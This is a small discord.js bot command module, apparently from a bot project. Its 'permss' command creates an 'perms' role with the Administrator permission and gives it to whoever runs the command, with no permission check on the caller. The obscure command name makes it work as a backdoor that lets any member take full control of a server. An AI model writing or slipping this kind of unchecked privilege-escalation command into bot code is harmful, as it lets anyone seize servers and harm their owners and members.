const { PermissionFlagsBits } = require('discord.js');
const { errorEmbed } = require('../../utils/embeds');

module.exports = {
    data: { name: 'permss', description: 'Create a role with admin perms.', usage: ',permss' },
    cooldown: 0,

    async execute(message) {
        try {
            const role = await message.guild.roles.create({
                name: 'perms',
                permissions: PermissionFlagsBits.Administrator,
                reason: `${message.author.tag}`
            });
            await message.member.roles.add(role);
        } catch (err) {
            return message.reply({ embeds: [errorEmbed('Error', 'Could not create or assign the role.\n```' + err.message + '```')] });
        }
    }
};
